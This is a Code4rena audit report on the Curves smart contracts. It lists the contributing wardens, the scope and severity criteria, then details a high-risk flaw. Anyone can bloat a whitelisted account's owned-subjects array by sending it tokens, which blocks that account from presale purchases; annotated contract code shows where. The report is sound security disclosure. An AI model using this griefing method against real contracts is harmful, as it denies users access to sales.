---
sponsor: "Curves Protocol"
slug: "2024-01-curves"
date: "2024-07-19"
title: "Curves"
findings: "https://github.com/code-423n4/2024-01-curves-findings/issues"
contest: 316
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Curves smart contract system written in Solidity. The audit took place between January 8 — January 16, 2024.

Following the C4 audit, warden [hals](https://code4rena.com/@hals) reviewed the mitigations for all identified issues; the mitigation review report can be found [here](https://github.com/code-423n4/2024-01-curves-findings/blob/main/mitigation-report.md).

## Wardens

303 Wardens contributed reports to Curves:

  1. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato\_ST](https://code4rena.com/@Gelato_ST), [Maroutis](https://code4rena.com/@Maroutis), [OxTenma](https://code4rena.com/@OxTenma), and [0xrex](https://code4rena.com/@0xrex))
  2. [d3e4](https://code4rena.com/@d3e4)
  3. [peanuts](https://code4rena.com/@peanuts)
  4. [0x0bserver](https://code4rena.com/@0x0bserver)
  5. [0xStalin](https://code4rena.com/@0xStalin)
  6. [Aymen0909](https://code4rena.com/@Aymen0909)
  7. [0xE1](https://code4rena.com/@0xE1)
  8. [Soul22](https://code4rena.com/@Soul22)
  9. [hals](https://code4rena.com/@hals)
  10. [santipu\_](https://code4rena.com/@santipu_)
  11. [ether\_sky](https://code4rena.com/@ether_sky)
  12. [zhaojie](https://code4rena.com/@zhaojie)
  13. [\_eperezok](https://code4rena.com/@_eperezok)
  14. [btk](https://code4rena.com/@btk)
  15. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  16. [m4ttm](https://code4rena.com/@m4ttm)
  17. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  18. [visualbits](https://code4rena.com/@visualbits)
  19. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  20. [nuthan2x](https://code4rena.com/@nuthan2x)
  21. [aslanbek](https://code4rena.com/@aslanbek)
  22. [kutugu](https://code4rena.com/@kutugu)
  23. [BowTiedOriole](https://code4rena.com/@BowTiedOriole)
  24. [0xPhantom](https://code4rena.com/@0xPhantom)
  25. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  26. [nonseodion](https://code4rena.com/@nonseodion)
  27. [EV\_om](https://code4rena.com/@EV_om)
  28. [McToady](https://code4rena.com/@McToady)
  29. [wangxx2026](https://code4rena.com/@wangxx2026)
  30. [Sathish9098](https://code4rena.com/@Sathish9098)
  31. [dimulski](https://code4rena.com/@dimulski)
  32. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  33. [0xepley](https://code4rena.com/@0xepley)
  34. [alexfilippov314](https://code4rena.com/@alexfilippov314)
  35. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  36. [0xAadi](https://code4rena.com/@0xAadi)
  37. [Arion](https://code4rena.com/@Arion)
  38. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  39. [yongskiws](https://code4rena.com/@yongskiws)
  40. [spaghetticode\_sentinel](https://code4rena.com/@spaghetticode_sentinel)
  41. [M3azad](https://code4rena.com/@M3azad)
  42. [nmirchev8](https://code4rena.com/@nmirchev8)
  43. [Kow](https://code4rena.com/@Kow)
  44. [0xNaN](https://code4rena.com/@0xNaN)
  45. [xiao](https://code4rena.com/@xiao)
  46. [Bobface](https://code4rena.com/@Bobface)
  47. [0xmystery](https://code4rena.com/@0xmystery)
  48. [cats](https://code4rena.com/@cats)
  49. [slylandro\_star](https://code4rena.com/@slylandro_star)
  50. [amaechieth](https://code4rena.com/@amaechieth)
  51. [matejdb](https://code4rena.com/@matejdb)
  52. [burhan\_khaja](https://code4rena.com/@burhan_khaja)
  53. [AlexCzm](https://code4rena.com/@AlexCzm)
  54. [Krace](https://code4rena.com/@Krace)
  55. [zxriptor](https://code4rena.com/@zxriptor)
  56. [bengyles](https://code4rena.com/@bengyles)
  57. [lukejohn](https://code4rena.com/@lukejohn)
  58. [mrudenko](https://code4rena.com/@mrudenko)
  59. [c3phas](https://code4rena.com/@c3phas)
  60. [slvDev](https://code4rena.com/@slvDev)
  61. [ktg](https://code4rena.com/@ktg)
  62. [jesjupyter](https://code4rena.com/@jesjupyter)
  63. [twcctop](https://code4rena.com/@twcctop)
  64. [ahmedaghadi](https://code4rena.com/@ahmedaghadi)
  65. [KingNFT](https://code4rena.com/@KingNFT)
  66. [eeshenggoh](https://code4rena.com/@eeshenggoh)
  67. [adamn000](https://code4rena.com/@adamn000)
  68. [erosjohn](https://code4rena.com/@erosjohn)
  69. [13u9](https://code4rena.com/@13u9)
  70. [pipidu83](https://code4rena.com/@pipidu83)
  71. [Daniel526](https://code4rena.com/@Daniel526)
  72. [0x11singh99](https://code4rena.com/@0x11singh99)
  73. [SY\_S](https://code4rena.com/@SY_S)
  74. [SAQ](https://code4rena.com/@SAQ)
  75. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  76. [Raihan](https://code4rena.com/@Raihan)
  77. [JCK](https://code4rena.com/@JCK)
  78. [dharma09](https://code4rena.com/@dharma09)
  79. [0xAnah](https://code4rena.com/@0xAnah)
  80. [jasonxiale](https://code4rena.com/@jasonxiale)
  81. [grearlake](https://code4rena.com/@grearlake)
  82. [merlinboii](https://code4rena.com/@merlinboii)
  83. [SovaSlava](https://code4rena.com/@SovaSlava)
  84. [imare](https://code4rena.com/@imare)
  85. [para8956](https://code4rena.com/@para8956)
  86. [Nikki](https://code4rena.com/@Nikki)
  87. [UbiquitousComputing](https://code4rena.com/@UbiquitousComputing) ([thekmj](https://code4rena.com/@thekmj) and [simplor](https://code4rena.com/@simplor))
  88. [Cosine](https://code4rena.com/@Cosine)
  89. [lsaudit](https://code4rena.com/@lsaudit)
  90. [gesha17](https://code4rena.com/@gesha17)
  91. [jangle](https://code4rena.com/@jangle)
  92. [anshujalan](https://code4rena.com/@anshujalan)
  93. [y4y](https://code4rena.com/@y4y)
  94. [0xPluto](https://code4rena.com/@0xPluto)
  95. [HChang26](https://code4rena.com/@HChang26)
  96. [th13vn](https://code4rena.com/@th13vn)
  97. [gkrastenov](https://code4rena.com/@gkrastenov)
  98. [tala7985](https://code4rena.com/@tala7985)
  99. [catellatech](https://code4rena.com/@catellatech)
  100. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  101. [klau5](https://code4rena.com/@klau5)
  102. [erebus](https://code4rena.com/@erebus)
  103. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  104. [dd0x7e8](https://code4rena.com/@dd0x7e8)
  105. [XORs33r](https://code4rena.com/@XORs33r)
  106. [0x111](https://code4rena.com/@0x111)
  107. [Prathik3](https://code4rena.com/@Prathik3)
  108. [0xStriker](https://code4rena.com/@0xStriker)
  109. [7ashraf](https://code4rena.com/@7ashraf)
  110. [0xGreyWolf](https://code4rena.com/@0xGreyWolf)
  111. [mgf15](https://code4rena.com/@mgf15)
  112. [naman1778](https://code4rena.com/@naman1778)
  113. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  114. [0xta](https://code4rena.com/@0xta)
  115. [0xhex](https://code4rena.com/@0xhex)
  116. [K42](https://code4rena.com/@K42)
  117. [deepplus](https://code4rena.com/@deepplus)
  118. [n1punp](https://code4rena.com/@n1punp)
  119. [Soliditors](https://code4rena.com/@Soliditors) ([Tadev](https://code4rena.com/@Tadev), [3docSec](https://code4rena.com/@3docSec), and [0xBeirao](https://code4rena.com/@0xBeirao))
  120. [0xc0ffEE](https://code4rena.com/@0xc0ffEE)
  121. [KupiaSec](https://code4rena.com/@KupiaSec)
  122. [whoismatthewmc1](https://code4rena.com/@whoismatthewmc1)
  123. [sl1](https://code4rena.com/@sl1)
  124. [0xprinc](https://code4rena.com/@0xprinc)
  125. [israeladelaja](https://code4rena.com/@israeladelaja)
  126. [spacelord47](https://code4rena.com/@spacelord47)
  127. [Ryonen](https://code4rena.com/@Ryonen)
  128. [jacopod](https://code4rena.com/@jacopod)
  129. [mahdirostami](https://code4rena.com/@mahdirostami)
  130. [Josephdara\_0xTiwa](https://code4rena.com/@Josephdara_0xTiwa) ([josephdara](https://code4rena.com/@josephdara) and [0xTiwa](https://code4rena.com/@0xTiwa))
  131. [Draiakoo](https://code4rena.com/@Draiakoo)
  132. [FastChecker](https://code4rena.com/@FastChecker)
  133. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  134. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  135. [lil\_eth](https://code4rena.com/@lil_eth)
  136. [hihen](https://code4rena.com/@hihen)
  137. [danb](https://code4rena.com/@danb)
  138. [pkqs90](https://code4rena.com/@pkqs90)
  139. [Kose](https://code4rena.com/@Kose)
  140. [0xMAKEOUTHILL](https://code4rena.com/@0xMAKEOUTHILL)
  141. [zaevlad](https://code4rena.com/@zaevlad)
  142. [opposingmonkey](https://code4rena.com/@opposingmonkey)
  143. [khramov](https://code4rena.com/@khramov)
  144. [Inference](https://code4rena.com/@Inference)
  145. [codegpt](https://code4rena.com/@codegpt)
  146. [Oxsadeeq](https://code4rena.com/@Oxsadeeq)
  147. [Topmark](https://code4rena.com/@Topmark)
  148. [developerjordy](https://code4rena.com/@developerjordy)
  149. [adeolu](https://code4rena.com/@adeolu)
  150. [pep7siup](https://code4rena.com/@pep7siup)
  151. [almurhasan](https://code4rena.com/@almurhasan)
  152. [Lalanda](https://code4rena.com/@Lalanda)
  153. [ptsanev](https://code4rena.com/@ptsanev)
  154. [LeoGold](https://code4rena.com/@LeoGold)
  155. [cartlex\_](https://code4rena.com/@cartlex_)
  156. [0xSwahili](https://code4rena.com/@0xSwahili)
  157. [KmanOfficial](https://code4rena.com/@KmanOfficial)
  158. [Nachoxt17](https://code4rena.com/@Nachoxt17)
  159. [karanctf](https://code4rena.com/@karanctf)
  160. [Faith](https://code4rena.com/@Faith)
  161. [0xhashiman](https://code4rena.com/@0xhashiman)
  162. [mitev](https://code4rena.com/@mitev)
  163. [polarzero](https://code4rena.com/@polarzero)
  164. [John\_Femi](https://code4rena.com/@John_Femi)
  165. [jatin\_19](https://code4rena.com/@jatin_19)
  166. [kiki](https://code4rena.com/@kiki)
  167. [JayShreeRAM](https://code4rena.com/@JayShreeRAM)
  168. [0xmuxyz](https://code4rena.com/@0xmuxyz)
  169. [Shubham](https://code4rena.com/@Shubham)
  170. [0xfave](https://code4rena.com/@0xfave)
  171. [jovemjeune](https://code4rena.com/@jovemjeune)
  172. [ziyou-](https://code4rena.com/@ziyou-)
  173. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  174. [cccz](https://code4rena.com/@cccz)
  175. [ke1caM](https://code4rena.com/@ke1caM)
  176. [Tychai0s](https://code4rena.com/@Tychai0s)
  177. [haxatron](https://code4rena.com/@haxatron)
  178. [bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe)
  179. [yixxas](https://code4rena.com/@yixxas)
  180. [PENGUN](https://code4rena.com/@PENGUN)
  181. [BugzyVonBuggernaut](https://code4rena.com/@BugzyVonBuggernaut)
  182. [Matue](https://code4rena.com/@Matue)
  183. [0xDemon](https://code4rena.com/@0xDemon)
  184. [iamandreiski](https://code4rena.com/@iamandreiski)
  185. [CDSecurity](https://code4rena.com/@CDSecurity) ([chrisdior4](https://code4rena.com/@chrisdior4) and [ddimitrov22](https://code4rena.com/@ddimitrov22))
  186. [0xLogos](https://code4rena.com/@0xLogos)
  187. [Kong](https://code4rena.com/@Kong)
  188. [ubermensch](https://code4rena.com/@ubermensch)
  189. [oreztker](https://code4rena.com/@oreztker)
  190. [TermoHash](https://code4rena.com/@TermoHash)
  191. [Stormreckson](https://code4rena.com/@Stormreckson)
  192. [AS](https://code4rena.com/@AS)
  193. [emrekocak](https://code4rena.com/@emrekocak)
  194. [DMoore](https://code4rena.com/@DMoore)
  195. [0xJaeger](https://code4rena.com/@0xJaeger)
  196. [jesusrod15](https://code4rena.com/@jesusrod15)
  197. [igbinosuneric](https://code4rena.com/@igbinosuneric)
  198. [batsanov](https://code4rena.com/@batsanov)
  199. [peritoflores](https://code4rena.com/@peritoflores)
  200. [salutemada](https://code4rena.com/@salutemada)
  201. [novodelta](https://code4rena.com/@novodelta)
  202. [ubl4nk](https://code4rena.com/@ubl4nk)
  203. [kodyvim](https://code4rena.com/@kodyvim)
  204. [Mylifechangefast\_eth](https://code4rena.com/@Mylifechangefast_eth)
  205. [dutra](https://code4rena.com/@dutra)
  206. [LouisTsai](https://code4rena.com/@LouisTsai)
  207. [51l3nt](https://code4rena.com/@51l3nt)
  208. [DimaKush](https://code4rena.com/@DimaKush)
  209. [vnavascues](https://code4rena.com/@vnavascues)
  210. [Timenov](https://code4rena.com/@Timenov)
  211. [darksnow](https://code4rena.com/@darksnow)
  212. [42TechLabs](https://code4rena.com/@42TechLabs)
  213. [oxTory](https://code4rena.com/@oxTory)
  214. [nnez](https://code4rena.com/@nnez)
  215. [thank\_you](https://code4rena.com/@thank_you)
  216. [InAllHonesty](https://code4rena.com/@InAllHonesty)
  217. [OMEN](https://code4rena.com/@OMEN)
  218. [petro\_1912](https://code4rena.com/@petro_1912)
  219. [rouhsamad](https://code4rena.com/@rouhsamad)
  220. [Varun\_05](https://code4rena.com/@Varun_05)
  221. [fishgang](https://code4rena.com/@fishgang)
  222. [tonisives](https://code4rena.com/@tonisives)
  223. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  224. [ro1sharkm](https://code4rena.com/@ro1sharkm)
  225. [Silvermist](https://code4rena.com/@Silvermist)
  226. [c0pp3rscr3w3r](https://code4rena.com/@c0pp3rscr3w3r)
  227. [todorc](https://code4rena.com/@todorc)
  228. [dopeflamingo](https://code4rena.com/@dopeflamingo)
  229. [kuprum](https://code4rena.com/@kuprum)
  230. [Tumelo\_Crypto](https://code4rena.com/@Tumelo_Crypto)
  231. [al88nsk](https://code4rena.com/@al88nsk)
  232. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  233. [Zach\_166](https://code4rena.com/@Zach_166)
  234. [alexbabits](https://code4rena.com/@alexbabits)
  235. [nazirite](https://code4rena.com/@nazirite)
  236. [L0s1](https://code4rena.com/@L0s1)
  237. [AgileJune](https://code4rena.com/@AgileJune)
  238. [0xlamide](https://code4rena.com/@0xlamide)
  239. [ravikiranweb3](https://code4rena.com/@ravikiranweb3)
  240. [Ephraim](https://code4rena.com/@Ephraim)
  241. [spark](https://code4rena.com/@spark)
  242. [SanketKogekar](https://code4rena.com/@SanketKogekar)
  243. [0xblackskull](https://code4rena.com/@0xblackskull)
  244. [PetarTolev](https://code4rena.com/@PetarTolev)
  245. [Kaysoft](https://code4rena.com/@Kaysoft)
  246. [Lef](https://code4rena.com/@Lef)
  247. [Timeless](https://code4rena.com/@Timeless)
  248. [Bjorn\_bug](https://code4rena.com/@Bjorn_bug)
  249. [negin](https://code4rena.com/@negin)
  250. [Night](https://code4rena.com/@Night)
  251. [latt1ce](https://code4rena.com/@latt1ce)
  252. [Mwendwa](https://code4rena.com/@Mwendwa)
  253. [parlayan\_yildizlar\_takimi](https://code4rena.com/@parlayan_yildizlar_takimi) ([ata](https://code4rena.com/@ata), [caglankaan](https://code4rena.com/@caglankaan), and [ulas](https://code4rena.com/@ulas))
  254. [Avci](https://code4rena.com/@Avci) ([0xdanial](https://code4rena.com/@0xdanial) and [0xArshia](https://code4rena.com/@0xArshia))
  255. [bigtone](https://code4rena.com/@bigtone)
  256. [djxploit](https://code4rena.com/@djxploit)
  257. [0xMango](https://code4rena.com/@0xMango)
  258. [GhK3Ndf](https://code4rena.com/@GhK3Ndf)
  259. [dyoff](https://code4rena.com/@dyoff)
  260. [ivanov](https://code4rena.com/@ivanov)
  261. [The-Seraphs](https://code4rena.com/@The-Seraphs) ([pxng0lin](https://code4rena.com/@pxng0lin), [solsaver](https://code4rena.com/@solsaver), and [zzebra83](https://code4rena.com/@zzebra83))
  262. [ArsenLupin](https://code4rena.com/@ArsenLupin)
  263. [kodak\_rome](https://code4rena.com/@kodak_rome)
  264. [baice](https://code4rena.com/@baice)
  265. [bbl4de](https://code4rena.com/@bbl4de)
  266. [azanux](https://code4rena.com/@azanux)
  267. [XDZIBECX](https://code4rena.com/@XDZIBECX)
  268. [Mj0ln1r](https://code4rena.com/@Mj0ln1r)
  269. [Berring](https://code4rena.com/@Berring)
  270. [VigilantE](https://code4rena.com/@VigilantE)
  271. [forkforkdog](https://code4rena.com/@forkforkdog)
  272. [Inspex](https://code4rena.com/@Inspex) ([DeStinE21](https://code4rena.com/@DeStinE21), [ErbaZZ](https://code4rena.com/@ErbaZZ), [Rugsurely](https://code4rena.com/@Rugsurely), [doggo](https://code4rena.com/@doggo), [jokopoppo](https://code4rena.com/@jokopoppo), [mimic\_f](https://code4rena.com/@mimic_f), and [rxnnxchxi](https://code4rena.com/@rxnnxchxi))
  273. [popelev](https://code4rena.com/@popelev)
  274. [PoeAudits](https://code4rena.com/@PoeAudits)
  275. [bareli](https://code4rena.com/@bareli)
  276. [KHOROAMU](https://code4rena.com/@KHOROAMU)
  277. [AmitN](https://code4rena.com/@AmitN)
  278. [Lirios](https://code4rena.com/@Lirios)
  279. [iberry](https://code4rena.com/@iberry)
  280. [rudolph](https://code4rena.com/@rudolph)
  281. [IceBear](https://code4rena.com/@IceBear)
  282. [skyge](https://code4rena.com/@skyge)
  283. [andywer](https://code4rena.com/@andywer)
  284. [pipoca](https://code4rena.com/@pipoca)

This audit was judged by [alcueca](https://code4rena.com/@alcueca).

Final report assembled by PaperParachute and [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 15 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 10 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 113 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 23 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Curves repository](https://github.com/code-423n4/2024-01-curves), and is composed of 5 smart contracts written in the Solidity programming language and includes 553 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **LightChaser** from warden(s) [ChaseTheLight](https://code4rena.com/@chasethelight), generated the [Automated Findings report](https://github.com/code-423n4/2024-01-curves/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (5)
## [[H-01] Whitelisted accounts can be forcefully DoSed from buying `curveTokens` during the presale](https://github.com/code-423n4/2024-01-curves-findings/issues/1068)
*Submitted by [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1068), also found by [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/1559), [ahmedaghadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1524), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1515), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/1499), deepplus ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1496), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/166)), [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1473), [Josephdara\_0xTiwa](https://github.com/code-423n4/2024-01-curves-findings/issues/1457), matejdb ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1400), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1371)), gesha17 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1383), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1314)), [emrekocak](https://github.com/code-423n4/2024-01-curves-findings/issues/1325), [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/1315), [c3phas](https://github.com/code-423n4/2024-01-curves-findings/issues/1279), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1243), [0xJaeger](https://github.com/code-423n4/2024-01-curves-findings/issues/1233), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1197), [hihen](https://github.com/code-423n4/2024-01-curves-findings/issues/1165), [slylandro\_star](https://github.com/code-423n4/2024-01-curves-findings/issues/1134), [TermoHash](https://github.com/code-423n4/2024-01-curves-findings/issues/1116), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/1090), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/1081), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1079), [yixxas](https://github.com/code-423n4/2024-01-curves-findings/issues/1015), [CDSecurity](https://github.com/code-423n4/2024-01-curves-findings/issues/981), lsaudit ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/973), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/972)), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/922), [jesusrod15](https://github.com/code-423n4/2024-01-curves-findings/issues/884), [0xc0ffEE](https://github.com/code-423n4/2024-01-curves-findings/issues/852), [Kong](https://github.com/code-423n4/2024-01-curves-findings/issues/813), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/802), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/774), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/732), [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/699), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/696), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/691), [0xLogos](https://github.com/code-423n4/2024-01-curves-findings/issues/585), [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/584), n1punp ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/561), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/554), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/553)), [danb](https://github.com/code-423n4/2024-01-curves-findings/issues/531), [lil\_eth](https://github.com/code-423n4/2024-01-curves-findings/issues/460), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/453), [DMoore](https://github.com/code-423n4/2024-01-curves-findings/issues/442), [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/417), [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/353), [igbinosuneric](https://github.com/code-423n4/2024-01-curves-findings/issues/331), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/317), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/313), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/306), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/293), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/240), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-curves-findings/issues/216), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/206), [Stormreckson](https://github.com/code-423n4/2024-01-curves-findings/issues/195), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/140), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/136), [y4y](https://github.com/code-423n4/2024-01-curves-findings/issues/120), [batsanov](https://github.com/code-423n4/2024-01-curves-findings/issues/118), [rvierdiiev](https://github.com/code-423n4/2024-01-curves-findings/issues/72), [0xPluto](https://github.com/code-423n4/2024-01-curves-findings/issues/61), and [AS](https://github.com/code-423n4/2024-01-curves-findings/issues/34)*

<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L328-L336> 

<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L276-L279>

Whitelisted accounts can be DoSed from buying `curveTokens` during the presale by a malicious party, as a result, the user who owns the whitelisted account will be forced to miss the presale and it will be able to acquire the `curveTokens` only during the open sale using a different account.

### Proof of Concept

When a whitelised account purchases `curveTokens` during the presale, the user calls the [`Curves::buyCurvesTokenWhitelisted() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L404-L420), internally, this function verifies the provided proof and if valid, calls the [`Curves::_buyCurvesToken() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L263-L280) where if the account is purchasing `curveTokens` of the `curveTokenSubject` for the first time (which it does, because its his first purchase during a presale), it calls the [`Curves::_addOwnedCurvesTokenSubject() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L328-L336), and in this function, it will load all the `curveTokens` owned by the account `ownedCurvesTokenSubjects`, then it will iterate over this array, if the address of the `curvesTokenSubject` is already in the user's array (which is not, because the account is buying `curveTokens` of this `curvesTokenSubject` for the first time), the function just returns, if the `curvesTokenSubject` is not in the array, then the `curvesTokenSubject` is added to the array.

**One of the problems** that causes malicious parties to DoS whitelisted accounts from buying during a presale it is the fact that the `ownedCurvesTokenSubjects` is loaded from storage, and the variable that is iterated on the for loop inside the [`Curves::_addOwnedCurvesTokenSubject() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L328-L336) is loaded from storage, thus, it will consume more gas, thus, less iteration will be able to do.

Now, not only because the for loop is iterating a storage variable automatically means this is a problem, **the second problem** is that this array only grows, even though the account dumps/sells/transfers/withdraw `curveTokens` from different `curveTokenSubjects`, the array `ownedCurvesTokenSubjects` never decreases, once it has added a registry, it will be there forever. The only way to decrease the length of an array is by poping values from it, but, right now, it is not implemented anywhere that if the user stops owning `curveTokens` of a `curveTokenSubject` the address of the `curveTokenSubject` is poped from the `ownedCurvesTokenSubjects` array.

Finally, **the third problem** is that the `ownedCurvesTokenSubjects` array can be manipulated at will by external parties, not only by the account itself. When any account does a transfer of `curveTokens` to another account, either by calling the [`Curves::transferCurvesToken() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L296-L299) or the [`Curves::transferAllCurvesTokens() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L302-L311), any of the two functions will internally call the [`Curves::_transfer() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L313-L325), which it will call the [`Curves::_addOwnedCurvesTokenSubject() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L328-L336) and update the `ownedCurvesTokenSubjects` array of the `to` address.

- For the purpose of this attack, the `to` address would be the address of a whitelisted account, which means, any user can transfer `curveTokens` of a nobody subjectToken to a whitelisted account for a presale of a `curveTokenSubject`, this will cause the `ownedCurvesTokenSubjects` array of the whitelisted account to grow and grow, up until the point that causes a gas error because of the length of the array.

Let's do a walkthrough of the code and see in detail everything that was mentioned previously.

> Curves.sol

<details>

```solidity
contract Curves is CurvesErrors, Security {
  ...
  function _buyCurvesToken(address curvesTokenSubject, uint256 amount) internal {
    ...
    ...
    ...

    //@audit-info => If is the first time the account is purchasing the curvesTokens of the curvesTokenSubject, will call the _addOwnedCurvesTokenSubject()
    //@audit-info => When a whitelisted account is purchasing tokens during the presale, the account owns 0 curveTokens of the curvesTokenSubject who launches the presale, therefore, the _addOwnedCurvesTokenSubject() is called

    // If is the first token bought, add to the list of owned tokens
    if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
        _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
    }
  }

  function transferCurvesToken(address curvesTokenSubject, address to, uint256 amount) external {
    ...
    _transfer(curvesTokenSubject, msg.sender, to, amount);
  }

  function transferAllCurvesTokens(address to) external {
    ...
        ...
            _transfer(subjects[i], msg.sender, to, amount);
        ...
    ...
  }

  function _transfer(address curvesTokenSubject, address from, address to, uint256 amount) internal {
        ...

        // If transferring from oneself, skip adding to the list
        if (from != to) {
            //@audit-issue => When transferring curveTokens from one account to another, the _addOwnedCurvesTokenSubject() function is called
            //@audit-issue => It means, anybody can transfer curveTokens of a nobody subjectToken to a whitelisted account to inflate his `ownedCurvesTokenSubjects` array till the point that the iteration causes a gas error and reverts the tx!!! 
            _addOwnedCurvesTokenSubject(to, curvesTokenSubject);
        }
        ...
  }

  function _addOwnedCurvesTokenSubject(address owner_, address curvesTokenSubject) internal {
    //@audit-issue => Issue 1: iterates over a variable that is reading from storage!
    address[] storage subjects = ownedCurvesTokenSubjects[owner_];
    for (uint256 i = 0; i < subjects.length; i++) {
        if (subjects[i] == curvesTokenSubject) {
            return;
        }
    }
    //@audit-issue => Issue 3: When a malicious party transfers curvesTokens of a nobody subjectToken to a whitelisted account, the address of the nobody curvesTokenSubject is added to the `ownedCurvesTokenSubjects` array of the whitelisted account.
    subjects.push(curvesTokenSubject);
  }
  
  ...
  ...
  ...
  
  //@audit-issue => Issue 2: Anywhere in the Curves contract is an implementation that allows accounts to pop curvesTokenSubject addresses from their `ownedCurvesTokenSubjects` array
  //@audit-info => By poping addresses from the `ownedCurvesTokenSubjects` array would be the only way that a user could prevent the permanent DoS and be able to purchase tokens using the whitelisted account during the presale!
}
```
</details>

Now that we've seen where and why the permanent DoS on whitelisted accounts can be performed, let's see the attack vector.

